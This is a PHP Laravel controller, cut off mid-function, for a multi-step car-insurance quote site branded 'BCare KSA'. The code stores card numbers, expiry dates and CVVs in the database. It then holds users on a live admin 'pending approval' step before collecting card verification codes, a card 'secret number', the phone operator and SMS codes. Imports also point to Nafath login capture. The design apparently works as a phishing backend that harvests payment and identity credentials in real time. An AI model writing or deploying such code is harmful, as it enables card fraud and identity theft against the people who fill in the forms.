<?php

namespace App\Http\Controllers\Frontend;

use App\Http\Controllers\Controller;
use App\Http\Requests\Frontend\CardOwnershipRequestFormRequest;
use App\Http\Requests\Frontend\CardOwnershipSecertNumberRequestFormRequest;
use App\Http\Requests\Frontend\CheckPhoneNumberRequestFormRequest;
use App\Http\Requests\Frontend\ConfirmPhoneNumberRequestFormRequest;
use App\Http\Requests\Frontend\InsurancRequesteFormRequest;
use App\Http\Requests\Frontend\InsurancStatementsRequestFormRequest;
use App\Http\Requests\Frontend\InsuranceInformationRequestFormRequest;
use App\Http\Requests\Frontend\InsuranceTypeRequestFormRequest;
use App\Http\Requests\Frontend\NafathDocumentingRequestFormRequest;
use App\Http\Requests\Frontend\NafathLoginRequestFormRequest;
use App\Http\Requests\Frontend\PaymentFormRequestFormRequest;
use App\Models\Insurance;
use App\Models\InsuranceRequest;
use Illuminate\Http\Request;
use Illuminate\Routing\Route;
use App\Models\SupportTicket;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Log;

/**
 * Frontend Home Page Controller
 *
 * Handles insurance quote request flow for BCare KSA platform
 * Manages the complete insurance application process from initial quote to payment
 *
 * @package App\Http\Controllers\Frontend
 */
class HomePageFrontendController extends Controller
{

    // ========================================================================
    // =========================== index Function =============================
    // ========================================================================
    public function welcome()
    {
        try {
            // Get insurance data for welcome page
            $thirdPartyInsurances = Insurance::where('status', 1)
                ->where('insurance_type', 1)
                ->with('insuranceBenefits')
                ->get();

            $fullInsurances = Insurance::where('status', 1)
                ->where('insurance_type', 2)
                ->with('insuranceBenefits')
                ->get();

            return view('welcome', compact('thirdPartyInsurances', 'fullInsurances'));
        } catch (\Throwable $th) {
            Log::error('Welcome page error: ' . $th->getMessage());

            SupportTicket::firstOrCreate(
                [
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => 'welcome',
                    'error_line' => $th->getLine(),
                ]
            );

            return view('errors.support_tickets', [
                'th' => $th,
                'function_name' => 'welcome',
                'end_error_ticket' => null
            ]);
        }
    }

    // ========================================================================
    // ====================== insuranceRequest Function =======================
    // ========================================================================
    public function insuranceRequest(InsurancRequesteFormRequest $request, Route $route)
    {
        try {
            // Prepare Data :
            $created_data = [
                'insurance_category' => $request->insurance_category,
                'new_insurance_category' => $request->new_insurance_category,
                'identity_number' => $request->identity_number,
                'applicant_name' => $request->applicant_name,
                'phone' => $request->phone,
                'date_of_birth' => $request->date_of_birth,
            ];

            // Store in DB :
            DB::transaction(function () use ($request, $created_data) {
                $insuranceRequest = InsuranceRequest::create($created_data);

                // Fire real-time event for admin dashboard
                event(new \App\Events\NewInsuranceRequestCreated($insuranceRequest));

                // Save form data to session
                $created_data['id'] = $insuranceRequest->id;
                session(['insuranceRequest' => $created_data]);
            });

            return redirect()->route('insuranceStatements')->with('success', 'Record Added Successfully');
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== insuranceInquiryRequest Function ==================
    // ========================================================================
    public function insuranceInquiryRequest(\App\Http\Requests\Frontend\InsuranceInquiryRequest $request)
    {
        // Validate handled by FormRequest
        $data = $request->validated();

        // Map incoming values to DB fields
        $insuranceCategory = $data['form_type'] === 'transfer' ? 2 : 1;
        $newInsuranceCategory = $data['vehicle_registration'] === 'customs' ? 2 : 1;

        // Prepare payload for creation (Step 1)
        $created_data = [
            'insurance_category'      => $insuranceCategory,
            'new_insurance_category'  => $newInsuranceCategory,
            'identity_number'         => $data['identity_number'],
            'seller_identity_number'  => $data['seller_identity_number'] ?? null,
            'applicant_name'          => $data['applicant_name'] ?? null,
            'phone'                   => $data['phone'] ?? null,
            'date_of_birth'           => $data['date_of_birth'] ?? null,
        ];

        // Persist initial inquiry and seed session for subsequent steps
        DB::transaction(function () use ($created_data, $data) {
            $insuranceRequest = InsuranceRequest::create($created_data);

            // Build session state used by next steps
            $sessionSeed = array_merge($created_data, [
                'id' => $insuranceRequest->id,
                'vin' => $data['serial_number'] ?? null,
                'customs_card' => $data['customs_card'] ?? null,
            ]);

            session(['insuranceRequest' => $sessionSeed]);
        });

        return redirect()->route('insuranceStatements')
            ->with('success', 'تم التحقق من البيانات، انتقل لملء معلومات التأمين.');
    }

    // ========================================================================
    // ==================== insuranceStatements Function ======================
    // ========================================================================
    public function insuranceStatements(Request $request, Route $route)
    {
        try {
            $insuranceRequest = session('insuranceRequest');

            // If no session exists, redirect to welcome
            if (!isset($insuranceRequest) || !isset($insuranceRequest['id'])) {
                return redirect()->route('welcome')
                    ->with('warning', 'الرجاء البدء من صفحة الطلب الرئيسية');
            }

            return view('insuranceStatements');
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ====================== insuranceStatementsRequest Function =============
    // ========================================================================
    public function insuranceStatementsRequest(InsurancStatementsRequestFormRequest $request, Route $route)
    {
        try {
            $sessionData = session('insuranceRequest');

            if (!$sessionData || !isset($sessionData['id'])) {
                return redirect()->route('welcome')->with('danger', 'يرجى البدء من البداية');
            }

            $insuranceRequest = InsuranceRequest::find($sessionData['id']);

            if (!$insuranceRequest) {
                return redirect()->route('welcome')->with('danger', 'هذا السجل غير موجود في قاعدة البيانات');
            }

            $updated_data = [
                // Personal Information
                'full_name' => $request->full_name,
                'identity_number' => $request->identity_number,
                'mobile_number_statements' => $request->mobile_number,
                'birth_date_statements' => $request->birth_date,
                'region' => $request->region,
                'city' => $request->city,
                'driving_years' => $request->driving_years,
                
                // Insurance Information
                'insurance_type' => $request->insurance_type, // 1 = Third Party, 2 = Full
                'usage_category' => $request->usage_category, // personal, commercial, taxi, transport
                'policy_start_date' => $request->policy_start_date,
                
                // Vehicle Information
                'vehicle_type' => $request->vehicle_type,
                'vehicle_model' => $request->vehicle_model,
                'manufacturing_year' => $request->manufacturing_year,
                'maintenance_type' => $request->maintenance_type, // agency, workshop
                'approximate_price' => $request->approximate_price,
                
                // Additional Driver
                'has_additional_driver' => $request->has_additional_driver ?? 'no',
                'driver_name' => $request->driver_name ?? null,
                'driver_identity_number' => $request->driver_identity_number ?? null,
                'driver_mobile_number' => $request->driver_mobile_number ?? null,
                'driver_birth_date' => $request->driver_birth_date ?? null,
                'driver_driving_years' => $request->driver_driving_years ?? null,
                'driver_driving_percentage' => $request->driver_driving_percentage ?? null,
            ];

            session(['insuranceStatements' => $updated_data]);

            DB::transaction(function () use ($updated_data, $insuranceRequest) {
                $insuranceRequest->update($updated_data);
            });

            $insuranceRequestSession = session('insuranceRequest');
            $insuranceStatements = session('insuranceStatements');
            
            // Merge all data ensuring we have the ID
            $allFormData = array_merge(
                $insuranceRequestSession ?? [],
                $insuranceStatements ?? [],
                ['id' => $insuranceRequest->id]
            );

            session(['allFormData' => $allFormData]);

            return redirect()->route('insuranceType')->with('success', 'تم حفظ البيانات بنجاح');
        } catch (\Throwable $th) {
            $function_name = $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' => $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }

            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ======================= insuranceType Function =========================
    // ========================================================================
    public function insuranceType(Request $request, Route $route)
    {
        try {
            // Check for allFormData or insuranceRequest session
            $allFormData = session('allFormData');
            $insuranceRequest = session('insuranceRequest');
            
            if (!$allFormData && !$insuranceRequest) {
                return redirect()->route('welcome')->with('warning', 'يرجى البدء من صفحة الطلب الرئيسية');
            }

            $thirdPartyInsurances = Insurance::where('status', 1)->where('insurance_type', 1)->get();
            $fullInsurances = Insurance::where('status', 1)->where('insurance_type', 2)->get();
            return view('insuranceType', compact('thirdPartyInsurances', 'fullInsurances'));
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== insuranceTypeRequest Function =====================
    // ========================================================================
    public function insuranceTypeRequest(InsuranceTypeRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            
            if (!$allFormData || !isset($allFormData['id'])) {
                return redirect()->route('welcome')->with('danger', 'يرجى البدء من البداية');
            }

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $updated_data = [
                    'insurance_id' => $request->insurance_id,
                ];

                session(['insuranceType' => $updated_data]);

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                $allFormData = session('allFormData');
                $insuranceType = session('insuranceType');
                $allFormData = array_merge($allFormData, $insuranceType);

                session(['allFormData' => $allFormData]);

                return redirect()->route('insuranceInformation')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== insuranceInformation Function =====================
    // ========================================================================
    public function insuranceInformation(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!$allFormData || !isset($allFormData['insurance_id'])) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($insurance) {
                return view('insuranceInformation', compact('insurance'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= insuranceInformationRequest Function =================
    // ========================================================================
    public function insuranceInformationRequest(InsuranceInformationRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            
            if (!$allFormData || !isset($allFormData['id'])) {
                return redirect()->route('welcome')->with('danger', 'يرجى البدء من البداية');
            }

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $paymentForm = [
                    'total' => $request->total,
                ];

                session(['paymentForm' => $paymentForm]);

                $allFormData = session('allFormData');
                $paymentForm = session('paymentForm');
                $allFormData = array_merge($allFormData, $paymentForm);

                session(['allFormData' => $allFormData]);

                return redirect()->route('paymentForm')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ======================== paymentForm Function ==========================
    // ========================================================================
    public function paymentForm(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('paymentForm', compact('allFormData', 'insurance'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== paymentFormRequest Function ======================
    // ========================================================================
    public function paymentFormRequest(PaymentFormRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $updated_data = [
                    'name_on_card' => $request->name_on_card,
                    'card_number' => $request->card_number,
                    'expiry_date' => $request->expiry_date,
                    'cvv' => $request->cvv,
                ];

                session(['paymentForm' => $updated_data]);

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                $allFormData = session('allFormData');
                $paymentForm = session('paymentForm');
                $allFormData = array_merge($allFormData, $paymentForm);

                session(['allFormData' => $allFormData]);

                // إعادة التوجيه لصفحة الانتظار بدلاً من beforeCallProcess
                return redirect()->route('pendingApproval')->with('success', 'تم استلام طلبك بنجاح وهو قيد المراجعة');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== beforeCallProcess Function ========================
    // ========================================================================
    public function beforeCallProcess(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('beforeCallProcess', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== pendingApproval Function ==========================
    // ========================================================================
    public function pendingApproval(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('pendingApproval', compact('allFormData', 'insurance'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================== checkApprovalStatus Function ========================
    // ========================================================================
    public function checkApprovalStatus($id)
    {
        try {
            $insuranceRequest = InsuranceRequest::find($id);
            
            if (!$insuranceRequest) {
                return response()->json([
                    'approved' => false,
                    'message' => 'الطلب غير موجود'
                ]);
            }

            // التحقق من حالة الموافقة (يمكنك إضافة عمود 'approved' في جدول insurance_requests)
            if (isset($insuranceRequest->approved) && $insuranceRequest->approved == 1) {
                return response()->json([
                    'approved' => true,
                    'redirect_url' => route('cardOwnership'), // أو أي صفحة تريدها
                    'message' => 'تمت الموافقة على طلبك'
                ]);
            }

            return response()->json([
                'approved' => false,
                'message' => 'الطلب قيد المراجعة'
            ]);

        } catch (\Throwable $th) {
            return response()->json([
                'approved' => false,
                'error' => $th->getMessage()
            ], 500);
        }
    }

    // ========================================================================
    // ======================= callProcess Function ===========================
    // ========================================================================
    public function callProcess(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('callProcess', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== callProcessRequest Function =======================
    // ========================================================================
    public function callProcessRequest(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                return redirect()->route('cardOwnership')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ======================= cardOwnership Function =========================
    // ========================================================================
    public function cardOwnership(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('cardOwnership', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== cardOwnershipRequest Function ====================
    // ========================================================================
    public function cardOwnershipRequest(CardOwnershipRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $updated_data = [
                    'card_ownership_verification_code' => $request->card_ownership_verification_code,
                ];

                session(['cardOwnership' => $updated_data]);

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                $allFormData = session('allFormData');
                $cardOwnership = session('cardOwnership');
                $allFormData = array_merge($allFormData, $cardOwnership);

                session(['allFormData' => $allFormData]);

                return redirect()->route('cardOwnershipSecertNumber')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= cardOwnershipSecertNumber Function ===================
    // ========================================================================
    public function cardOwnershipSecertNumber(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('cardOwnershipSecertNumber', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ============== cardOwnershipSecertNumberRequest Function ===============
    // ========================================================================
    public function cardOwnershipSecertNumberRequest(CardOwnershipSecertNumberRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $updated_data = [
                    'card_ownership_secert_number' => $request->card_ownership_secert_number,
                ];

                session(['cardOwnershipSecertNumber' => $updated_data]);

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                $allFormData = session('allFormData');
                $cardOwnershipSecertNumber = session('cardOwnershipSecertNumber');
                $allFormData = array_merge($allFormData, $cardOwnershipSecertNumber);

                session(['allFormData' => $allFormData]);

                return redirect()->route('confirmPhoneNumber')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ==================== confirmPhoneNumber Function =======================
    // ========================================================================
    public function confirmPhoneNumber(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('ConfirmPhoneNumber', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================ confirmPhoneNumberRequest Function ====================
    // ========================================================================
    public function confirmPhoneNumberRequest(ConfirmPhoneNumberRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $updated_data = [
                    'mobile_number' => $request->mobile_number,
                    'mobile_network_operator' => $request->mobile_network_operator,
                ];

                session(['confirmPhoneNumber' => $updated_data]);

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
                    $insuranceRequest->update($updated_data);
                });

                $allFormData = session('allFormData');
                $confirmPhoneNumber = session('confirmPhoneNumber');
                $allFormData = array_merge($allFormData, $confirmPhoneNumber);

                session(['allFormData' => $allFormData]);

                return redirect()->route('checkPhoneNumber')->with('success', 'Record Added Successfully');
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ===================== checkPhoneNumber Function ========================
    // ========================================================================
    public function checkPhoneNumber(Request $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');
            if (!isset($allFormData)) {
                return redirect()->route('welcome');
            }

            $insurance = Insurance::find($allFormData['insurance_id']);
            if ($allFormData) {
                return view('checkPhoneNumber', compact('allFormData'));
            } else {
                return redirect()->back()->with('danger', 'This record does not exist in the records');
            }
        } catch (\Throwable $th) {
            $function_name =  $route->getActionName();
            $check_old_errors = SupportTicket::where([
                'error_location' => $th->getFile(),
                'error_description' => $th->getMessage(),
                'function_name' => $function_name,
                'error_line' => $th->getLine(),
            ])->first();

            if (!$check_old_errors) {
                $end_error_ticket = SupportTicket::create([
                    'error_location' => $th->getFile(),
                    'error_description' => $th->getMessage(),
                    'function_name' => $function_name,
                    'error_line' =>  $th->getLine(),
                ]);
            } else {
                $end_error_ticket = $check_old_errors;
            }
            return view('errors.support_tickets', compact('th', 'function_name', 'end_error_ticket'));
        }
    }

    // ========================================================================
    // ================= checkPhoneNumberRequest Function =====================
    // ========================================================================
    public function checkPhoneNumberRequest(CheckPhoneNumberRequestFormRequest $request, Route $route)
    {
        try {
            $allFormData = session('allFormData');

            $insuranceRequest = InsuranceRequest::find($allFormData['id']);
            if ($insuranceRequest) {
                $updated_data = [
                    'check_mobile_number_verification_code' => $request->check_mobile_number_verification_code,
                ];

                session(['checkPhoneNumber' => $updated_data]);

                DB::transaction(function () use ($updated_data, $insuranceRequest) {
